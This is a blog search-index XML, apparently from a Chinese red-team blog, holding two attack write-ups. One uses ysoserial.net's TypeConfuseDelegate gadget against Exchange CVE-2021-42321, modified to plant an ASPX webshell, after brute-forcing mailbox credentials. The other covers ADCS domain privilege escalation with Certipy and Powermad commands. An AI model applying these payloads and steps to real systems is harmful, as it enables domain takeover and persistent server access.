<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TypeConfusedDelegate以及魔改yso</title>
    <link href="/2022/05/28/TypeConfusedDelegate%E4%BB%A5%E5%8F%8A%E9%AD%94%E6%94%B9yso/"/>
    <url>/2022/05/28/TypeConfusedDelegate%E4%BB%A5%E5%8F%8A%E9%AD%94%E6%94%B9yso/</url>
    
    <content type="html"><![CDATA[<h1 id="又一个Exchange实战"><a href="#又一个Exchange实战" class="headerlink" title="又一个Exchange实战"></a>又一个Exchange实战</h1><h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>这次的起因是一个日常的项目，探测版本发现是 <code>Exchange2019CU11</code>  小版本号 <code>15.2.986.5</code> </p><p>通过版本判断存在草老师的 CVE-2021-42321 漏洞</p><p>这个漏洞是通过ews接口触发的针对 <code>UserConfiguration</code> 的反序列化漏洞，网上也已经有公开的exp了</p><p>条件是拥有一个用户的凭据，通过ysoserial_net，使用<code>TypeConfusedDelegate</code> gadget生成payload发送即可。</p><p>不过针对这个目标在利用时遇到一些阻碍，正好之前没有怎么认真学习过.net的反序列化问题，所以就单独学了一下来解决问题。</p><p>这篇文章以下就不详述 CVE-2021-42321 了，具体的细节以及exchange的反序列化问题我比较想单独放一篇文章。</p><p>越看越觉得不懂的越来越多了。。。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>利用的话需要用户凭据，最直接的方法是通过工具或平台收集目标域名的邮箱账号，然后利用exchange的<code>ews</code>或者<code>autodiscover</code>接口进行爆破</p><p>而这次也是很幸运地爆破出了几个账号的口令。</p><p>于是直接利用exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c <span class="hljs-string">&quot;ping 123.dnslog.cn&quot;</span><br></code></pre></td></tr></table></figure><p>结果。。。白茫茫一片啥也没有</p><p>exchange因为安装以及更新的需求基本是需要出网的，所以这里大概率是exp没有成功。</p><p>于是将脚本的每一次请求的结果都打印了出来，发现了问题，最后一步，也就是触发反序列化的请求返回了500。</p><p>那这里有几种可能：</p><ul><li>漏洞通过某些方式的改动被修补了</li><li>gadget类型被黑了，因为不允许的类型会直接抛出错误</li><li>起进程的动作被杀软拦截了</li><li>payload传入直接被拦</li></ul><p>我尝试将payload修改了几个字符，就成功返回200了，结合一些其他的结果，大致判断是因为exchange上存在ATP之类的防护软件，将Process给拦截了。</p><h2 id="魔改Yso"><a href="#魔改Yso" class="headerlink" title="魔改Yso"></a>魔改Yso</h2><p>yso反序列化的利用都是起cmd进行命令执行，而当前的许多防护、EDR、ATP等都把 Process.Start 拦截的死死的，所以只能尝试修改一下yso_net小工具来尝试RCE。</p><p>新版的Yso已经有草老师提的直接通过**Assembly.Load()**加载dll来RCE的功能</p><p><img src="/img/article2/image-20220601083459048.png" alt="image-20220601083459048"></p><p>不过将他直接放进 <code>TypeConfusedDelegate</code> 有点麻烦，所以我选择更方便的做法，通过反序列化来直接写一个webshell。</p><h3 id="TypeConfusedDelegate"><a href="#TypeConfusedDelegate" class="headerlink" title="TypeConfusedDelegate"></a>TypeConfusedDelegate</h3><p>本次反序列化用到<code>TypeConfusedDelegate</code>链，所以我们先来简单看一下TypeConfusedDelegate链的大概原理</p><p>TypeConfusedDelegate 的释义为：类型混淆委托，那么两个要点就是*<strong>委托*** 、*</strong>类型混淆***</p><h4 id="委托和多播委托"><a href="#委托和多播委托" class="headerlink" title="委托和多播委托"></a>委托和多播委托</h4><p>委托可以理解为一个引用方法的变量，很像是C里的指针。委托主要就是c#为了让c++开发者适应没有指针的开发环境而搞出来的一套东西。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">delegate</span> <span class="hljs-keyword">void</span> <span class="hljs-title">MyDelegate</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PrintString</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span><br><span class="hljs-function"></span>    &#123;<br>        Console.WriteLine(s);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br><span class="hljs-function"></span>    &#123;<br>        MyDelegate myDelegate = <span class="hljs-keyword">new</span> MyDelegate(PrintString);<br>        myDelegate(<span class="hljs-string">&quot;test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过实例化 <code>MyDelegate</code> 来进行对<code>PrintString</code> 的引用以及传参。</p><p><strong>需要注意的是传递给委托的方法签名必须和定义的委托的返回值、参数一致。</strong></p><p>多播委托则是持有对委托列表的引用，把多播委托想象成一个列表，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">delegate</span> <span class="hljs-keyword">void</span> <span class="hljs-title">MyDelegate</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PrintString</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span><br><span class="hljs-function"></span>    &#123;<br>        Console.WriteLine(<span class="hljs-string">$&quot;print <span class="hljs-subst">&#123;s&#125;</span> to screen.&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteToFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span><br><span class="hljs-function"></span>    &#123;<br>        Console.WriteLine(<span class="hljs-string">$&quot;write <span class="hljs-subst">&#123;s&#125;</span> to file.&quot;</span>);<br>    &#125;<br>     <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br><span class="hljs-function"></span>    &#123;<br>        MyDelegate printString = <span class="hljs-keyword">new</span> MyDelegate(PrintString);<br>        MyDelegate writeFile = <span class="hljs-keyword">new</span> MyDelegate(WriteToFile);<br>        Delegate twoDelegte = MulticastDelegate.Combine(printString, writeFile);<br>        twoDelegte.DynamicInvoke(<span class="hljs-string">&quot;something&quot;</span>);<br>        Delegate[] delegates = twoDelegte.GetInvocationList();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> delegates)<br>        &#123;<br>            Console.WriteLine(item.Method);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 输出</span><br>print something to screen.<br>write something to file.<br><span class="hljs-function">Void <span class="hljs-title">PrintString</span>(<span class="hljs-params">System.String</span>)</span><br><span class="hljs-function">Void <span class="hljs-title">WriteToFile</span>(<span class="hljs-params">System.String</span>)</span><br></code></pre></td></tr></table></figure><p>我们通过 <code>MulticastDelegate.Combine</code> 合并两个委托。通过多播委托的 <code>GetInvocationList()</code> 可以得到委托的列表。</p><h4 id="TypeConfusedDelegate分析"><a href="#TypeConfusedDelegate分析" class="headerlink" title="TypeConfusedDelegate分析"></a>TypeConfusedDelegate分析</h4><p>然后再来看看 <code>TypeConfusedDelegate</code>链，他的核心代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">object</span> <span class="hljs-title">TypeConfuseDelegateGadget</span>(<span class="hljs-params">InputArgs inputArgs</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">string</span> cmdFromFile = inputArgs.CmdFromFile;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrEmpty(cmdFromFile))<br>    &#123;<br>        inputArgs.Cmd = cmdFromFile;<br>    &#125;<br><br>    Delegate da = <span class="hljs-keyword">new</span> Comparison&lt;<span class="hljs-built_in">string</span>&gt;(String.Compare);<br>    Comparison&lt;<span class="hljs-built_in">string</span>&gt; d = (Comparison&lt;<span class="hljs-built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);<br>    IComparer&lt;<span class="hljs-built_in">string</span>&gt; comp = Comparer&lt;<span class="hljs-built_in">string</span>&gt;.Create(d);<br>    SortedSet&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-keyword">set</span> = <span class="hljs-keyword">new</span> SortedSet&lt;<span class="hljs-built_in">string</span>&gt;(comp);<br>    <span class="hljs-keyword">set</span>.Add(inputArgs.CmdFileName);<br>    <span class="hljs-keyword">if</span> (inputArgs.HasArguments)<br>    &#123;<br>        <span class="hljs-keyword">set</span>.Add(inputArgs.CmdArguments);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">set</span>.Add(<span class="hljs-string">&quot;&quot;</span>); <span class="hljs-comment">// this is needed (as Process.Start accepts two args)</span><br>    &#125;<br><br>    FieldInfo fi = <span class="hljs-keyword">typeof</span>(MulticastDelegate).GetField(<span class="hljs-string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br>    <span class="hljs-built_in">object</span>[] invoke_list = d.GetInvocationList();<br>    <span class="hljs-comment">// Modify the invocation list to add Process::Start(string, string)</span><br>    invoke_list[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> Func&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>, Process&gt;(Process.Start);<br>    fi.SetValue(d, invoke_list);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">set</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到它使用了<code>SortedSet&lt;T&gt; </code> , 顾名思义<code>SortSet&lt;T&gt;</code> 是一个可排序的泛型集合。（泛型意为具体类型可以在声明实例时指定）它是c#里一个重要的数据结构，支持对存储的元素进行排序。</p><p>既然可以排序，那一定会涉及到比较，所以SortSet支持传入一个实例化的 <code>ICompare</code> 接口</p><p><img src="/img/article2/image-20220602005624648.png" alt="image-20220602005624648"></p><p>ICompare接口的Compare方法可以比较两个对象并返回一个整形结果</p><p>我们看代码中通过 <code>Compare&lt;T&gt;</code> 类实现了ICompare接口，而参数就是一个 <code>Compasison</code> 类 ,一个 <strong>委托</strong> 类型的比较器</p><p><img src="/img/article2/image-20220602010627771.png" alt="image-20220602010627771"></p><p>再来看SortedSet反序列化的过程。在OnDeserialization方法中，首先在序列化流中还原Compare，然后再还原SortedSet的每个元素，并调用Add添加到实例化后的SortedSet中。</p><p><img src="/img/article2/image-20220602011034736.png" alt="image-20220602011034736"></p><p>我们再回去看YSO的代码，其实他的思路很明确，先创建正常委托，然后通过反射修改正常委托的方法为恶意方法，当SortSet进行序列化的时候，就会触发恶意委托。而c#中的 <code>Func&lt;T&gt;</code> 即是一个万用的泛型委托，可以创建一个任意返回类型的委托。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-function"><span class="hljs-keyword">Func</span>&lt;<span class="hljs-title">T</span> <span class="hljs-title">x</span>, <span class="hljs-title">T</span> <span class="hljs-title">y</span>, <span class="hljs-title">T</span> <span class="hljs-title">result</span>&gt;<span class="hljs-params">(M)</span></span><br></code></pre></td></tr></table></figure><p>意为定义一个返回为<strong>result类型</strong>的<strong>M方法</strong>的委托，M方法的<strong>参数</strong>有两个，一个为<strong>x类型</strong>，一个为<strong>y类型</strong></p><p>例如把委托的Method设置为Process.Start，元素设置为 <code>cmd</code>，<code>/c calc</code> 时，就会执行 <code>Process.Start(&quot;cmd&quot;,&quot;/c calc&quot;)</code> 弹出一个计算器啦</p><p><strong>但是</strong>这时候问题出现了：前面说过，**<em>传递给委托的方法签名必须和定义的委托的返回值、参数一致**</em>，Comparison返回的是int，而Process.Start返回的是Process，这就造成了冲突，导致失败，所以代码里使用了多播委托。我们可以直接修改多播委托的<code>_invocatrionList</code>中的任意一个委托</p><p><img src="/img/article2/image-20220602011618707.png" alt="image-20220602011618707"></p><p>根据作者的解释，多播委托返回的是一个整型数，即指向进程对象的指针。（这里我也半懂不懂）</p><p>OK，这样就完整的进行了TypeConfusedDelegate反序列化！我们再回顾一下</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">// 创建比较器委托</span><br>Delegate da = <span class="hljs-keyword">new</span> Comparison&lt;<span class="hljs-built_in">string</span>&gt;(String.Compare);<br><span class="hljs-comment">// 用两个string的委托合并为一个多播委托</span><br>Comparison&lt;<span class="hljs-built_in">string</span>&gt; d = (Comparison&lt;<span class="hljs-built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);<br><span class="hljs-comment">// Create()函数返回new IComparer接口实例</span><br>IComparer&lt;<span class="hljs-built_in">string</span>&gt; comp = Comparer&lt;<span class="hljs-built_in">string</span>&gt;.Create(d);<br><span class="hljs-comment">// 将接口实例赋值给SortedSet的比较器</span><br>SortedSet&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-keyword">set</span> = <span class="hljs-keyword">new</span> SortedSet&lt;<span class="hljs-built_in">string</span>&gt;(comp);<br><span class="hljs-comment">// set.Add(&quot;cmd.exe&quot;)</span><br><span class="hljs-keyword">set</span>.Add(inputArgs.CmdFileName);<br><span class="hljs-comment">// set.Add(&quot;calc&quot;)</span><br><span class="hljs-keyword">set</span>.Add(inputArgs.CmdArguments);<br><span class="hljs-comment">// 反射修改_invocationList</span><br>FieldInfo fi = <span class="hljs-keyword">typeof</span>(MulticastDelegate).GetField(<span class="hljs-string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br><span class="hljs-built_in">object</span>[] invoke_list = d.GetInvocationList();<br><span class="hljs-comment">// 修改_invocationList 使用Func 添加基于Process::Start(string, string)的委托</span><br>invoke_list[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> Func&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>, Process&gt;(Process.Start);<br>fi.SetValue(d, invoke_list);<br></code></pre></td></tr></table></figure><h3 id="修改Ysoserial"><a href="#修改Ysoserial" class="headerlink" title="修改Ysoserial"></a>修改Ysoserial</h3><p>那么根据需求，我们需要的是在最后反序列化的时候，触发的委托不是新建一个进程，而是写入一个webshell</p><p>现在我们要做的就是简单的改一下最后使用反射修改的委托的定义</p><p>yso本来是更改为一个针对 Process.Start 方法的委托，而我们需要的是一个操作文件的方法，使用  <code>System.IO.File.WriteAllText</code> 即可</p><p>WriteAllText方法写文件接受两个参数：<code>WriteAllText(Path, Content)</code></p><h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><p>但是有一个问题是，<code>Func&lt;T&gt;</code> 是一个需要返回值的泛型委托，像 Process.Start 就会返回生成的Process类型对象</p><p>而 <code>File.WriteAllText</code> 返回是 void ,使用 Func 定义的话就会报错，因为Func不支持void返回类型</p><p>这个时候就可以使用 <code>Action &lt;T&gt;</code> 委托，他和 Func 基本相同没区别就是**<em>只需要输入参数不需要返回值。**</em></p><p><img src="/img/article2/image-20220601085103457.png" alt="image-20220601085103457"></p><p>这样就修改好啦，通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c 123<br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20220602020954152.png" alt="image-20220602020954152"></p><p>就可以在 <code>c:\inetpub\wwwroot\aspnet_client</code> 下生成一个内容为123 的1.aspx文件。</p><h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><p>但是当我想通过该方法想写入一些字母的字符串时，却发生了意外，一些字符串无法写入，当时直接进行了一个简单的测试，发现当首字母小于 <code>c</code> 时，就可以成功写入，大于c则不能。当时觉得时一个很奇怪的问题。</p><p>当时为了快速解决问题，利用了一个讨巧的方法，在shell的开头加了一个 <code>a</code> 就成功的写入了文件</p><p>现在重新理一遍，应该时因为修改的是invokelist[1] 的委托，而输入的参数已经经过了第一个正常的 Compare委托，而第一个参数是 <code>c:\xxxxxxx</code> 故第二个参数若开头大于c，会产生顺序的颠倒，导致错误。</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ADCS实战小坑记录</title>
    <link href="/2022/05/20/adcs%E5%AE%9E%E6%88%98%E5%B0%8F%E5%9D%91/"/>
    <url>/2022/05/20/adcs%E5%AE%9E%E6%88%98%E5%B0%8F%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ADCS实战小坑记录"><a href="#ADCS实战小坑记录" class="headerlink" title="ADCS实战小坑记录"></a>ADCS实战小坑记录</h1><p>周二爆出了域内的ADCS提权漏洞，这两天刚好在实战环境中遇到了，本来以为一帆风顺的梭哈环节却练练遭遇坑点，最后在和团长的讨论中一一解决，这里记录一下。</p><p>因为项目很多没截图，有些就不贴图了，大家脑补一下</p><h2 id="踩坑开始"><a href="#踩坑开始" class="headerlink" title="踩坑开始"></a>踩坑开始</h2><p>这个项目通过VPN连进了内网，想着也有好几个用户凭据，直接梭哈新洞美滋滋，没想到很快就来到了第一个问题。</p><h3 id="ldap错误"><a href="#ldap错误" class="headerlink" title="ldap错误"></a>ldap错误</h3><p>我一开始是通过文章里的 <code>Certipy</code> 工具去尝试攻击的，这个攻击流程的第一步是添加用户，并更改他的一些属性，这一步是通过ldap的。我直接使用</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Certipy account create &quot;domain/xxx:asdasd@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>&quot; -user x -dns dc.x.x<br></code></pre></td></tr></table></figure><p>结果第一步就出问题了</p><p>Certipy 直接报错超时了。显示的是  <code>ldap 监听失败</code> 。</p><p>怎么会这样呢，我试了一下，域控的389端口是开的。我去跟一遍了他的代码，发现他最后会去走 ldaps ,再一看，域控的636是没开的，怪不得会说超时，于是我强行把协议改成了 ldap ，又试了一次，结果又了报一个错：<code>&quot;strongerAuthRequired&quot;</code></p><p>于是我单独用 <code>ldap3</code> 库尝试去连接试了试，终于有了详细的报错</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">ldap3.core.exceptions.LDAPBindError: <span class="hljs-title">automatic</span> <span class="hljs-title">bind</span> <span class="hljs-title">not</span> <span class="hljs-title">successful</span> - &quot;<span class="hljs-title">strongerAuthRequired</span>&quot;</span><br></code></pre></td></tr></table></figure><p>这下我又仔细看了一遍代码，发现原来是因为ldap请求报了这个错，所以自动换了ldaps。</p><p>我查了一下，网上也说这个报错是需要套用ssl，那就还是使用了ldaps，，但是636端口又没开放，难顶。</p><h4 id="解决：Powermad"><a href="#解决：Powermad" class="headerlink" title="解决：Powermad"></a>解决：Powermad</h4><p><strong><em>BUT</em></strong> ，我使用 <code>adfind.exe</code> 导域信息又能成功的导出，而且导出信息写的还是走的域控的389端口。那么分析一下，adfind是c++写的，调用的是微软的原生类。而python的ldap3是自己封装的数据包</p><p>于是我觉得应该是python的 ldap3 库的ldap实现比较老了，但是不管什么情况，可以确定一点，那就是原生的system空间下的类应该可以连接成功。</p><p>所以我开始尝试寻找 Certipy 的代替品。突然想到之前委派使用过的一个工具: <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></p><p><img src="https://user-images.githubusercontent.com/5897462/62258617-2154ee00-b3d9-11e9-9414-67fadeb35f2f.png" alt="Powermad_logo"></p><p><img src="/img/article2/image-20220515003151301.png" alt="image-20220515003151301"></p><p>这个工具是专门用来添加机器账户的，由powershell编写，支持指定域控和凭据，非常方便。</p><p>他的readme里推荐配合 <code>runas</code> 一起用，不过我还是使用了他支持的 <code>$Credential</code> 定义，一顿摸索下终于解决了ldap的问题，成功添加了用户，并修改了相应的属性。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># run as administrator</span><br>&gt; <span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned<br><br>&gt; <span class="hljs-built_in">Import-Module</span> .\Powermad.ps1<br><br><span class="hljs-comment"># new machine</span><br>&gt; <span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;Cia\b1ue&quot;</span><br>&gt; <span class="hljs-variable">$PassWord</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Admin123...&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>&gt; <span class="hljs-variable">$Credential</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> <span class="hljs-string">&quot;System.Management.Automation.PSCredential&quot;</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>, <span class="hljs-variable">$PassWord</span><br>&gt; <span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> b1uetest <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-number">1</span>qaz@WSX <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-DomainController</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">1.1</span> <span class="hljs-literal">-domain</span> cia.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Credential</span><br>&gt; <span class="hljs-built_in">Set-MachineAccountAttribute</span> <span class="hljs-literal">-domain</span> cia.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Credential</span> <span class="hljs-literal">-DomainController</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">1.1</span> <span class="hljs-literal">-MachineAccount</span> b1uetest <span class="hljs-literal">-Attribute</span> ServicePrincipalName <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;HOST/b1uetest&quot;</span><br>&gt; <span class="hljs-built_in">Set-MachineAccountAttribute</span> <span class="hljs-literal">-domain</span> cia.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Credential</span> <span class="hljs-literal">-DomainController</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">1.1</span> <span class="hljs-literal">-MachineAccount</span> b1uetest <span class="hljs-literal">-Attribute</span> dNSHostName <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;dc.cia.local&quot;</span><br></code></pre></td></tr></table></figure><h3 id="smb错误"><a href="#smb错误" class="headerlink" title="smb错误"></a>smb错误</h3><p>第二个报错是当我使用 <code>Certipy</code> 去向域控请求证书的时候，它提示 445 连接失败。</p><p>Certipy请求走的是rpc和smb，而vpn没有给域控的445端口连接权限。</p><h4 id="解决：在域内getshell并反代"><a href="#解决：在域内getshell并反代" class="headerlink" title="解决：在域内getshell并反代"></a>解决：在域内getshell并反代</h4><p>其实本来是准备通过 80 端口 <code>http://dc_ip/certsrv/</code> 去申请证书，但是改代码太麻烦了。</p><p>运气不错，通过 CVE getshell 了一台内网机器，发现他是通域控的445的，于是决定通过这台机器做反代连通域控。</p><h3 id="寻找CA名"><a href="#寻找CA名" class="headerlink" title="寻找CA名"></a>寻找CA名</h3><p>当成功解决了连接域控的问题后，又遇到新的问题</p><p><code>Certipy</code> 请求证书的命令为</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">certipy req &quot;cia/b1uetest$:<span class="hljs-number">1</span>qaz@WSX@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>&quot; -ca CIA-DC-CA -template Machine<br></code></pre></td></tr></table></figure><p>其中 <code>-ca</code> 参数指定的是CA票据颁布者的名字，我一开始以为这个值是固定的 <code>域名-域控名-CA</code> 的组合，结果后来查询发现原来这个值是可以自己设置的。请求的时候又开始报错，当时就觉得应该是请求的名字错了。</p><h4 id="解决：在CA的web端"><a href="#解决：在CA的web端" class="headerlink" title="解决：在CA的web端"></a>解决：在CA的web端</h4><p>一通尝试无果后，团长发现，在CA的web端，页面的顶端是有这个名字的。</p><p><img src="/img/article2/image-20220515004551712.png" alt="image-20220515004551712"></p><p>当然后来查询资料得知，这个值在域信息中也是有的。</p><h3 id="模板错误"><a href="#模板错误" class="headerlink" title="模板错误"></a>模板错误</h3><p>我们使用了正确的CA名请求后，又给了我们一个新的报错</p><p><img src="/img/article2/image-20220515004815423.png" alt="image-20220515004815423"></p><p>说我当前用户没有权限请求这个模板，这个错误当时真的让我们很绝望，一度以为是这个漏洞被修补了，非常难受。我们当时猜测可能是管理员为了缓解这个漏洞，将 <code>Machine</code> 模板直接设置了不可请求，那这个洞也就彻底利用不了了。</p><p>我和团长相顾无言了数十分钟，一度准备放弃。但是我又考虑，如果真的修补了，为什么我还能修改机器的 <code>dNSHostName</code> 为域控，这个应该是最容易修补的地方才对。</p><p>我在我的实验环境里顺手又请求了一次，但是换了 <code>User</code> 凭证，然后他也报了同样的错。</p><p>这意味着，**<em>如果请求错了模板类型，就会报这个错**</em>。</p><p>顺着这个思路我们想，难道是 <code>Machine</code> 类型错了，但是机器用户确实就应该是 <code>Machine</code> 类型。团长说可能他把 <code>Machine</code> 改名了。</p><h4 id="解决：啼笑皆非"><a href="#解决：啼笑皆非" class="headerlink" title="解决：啼笑皆非"></a>解决：啼笑皆非</h4><p>于是我决定去查询一下域内现有的模板，如果没有 Machine，那就印证了团长的猜测。</p><p>模板内容同样可以通过域信息查询，我直接使用 <code>adexploer</code> 查询</p><p><img src="/img/article2/image-20220515010219124.png" alt="image-20220515010219124"></p><p>就在 <code>Configuration -&gt; Services -&gt; Public Key Service -&gt; Certificate Templates</code> 条目</p><p>我们发现确实有 <code>Machine</code> ，非常失望</p><p>就在准备关掉时，我突然发现了一个模板名：**<em>电脑（新）**</em></p><p><img src="/img/article2/image-20220602022754988.png" alt="image-20220602022754988"></p><p>我抱着尝试一下的想法试了试，，，，**<em>居然成功了**</em>，，，，</p><p>结论是：**<em>当报上述没有权限的错误时，记得去查看一下现有模板。**</em></p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无题</title>
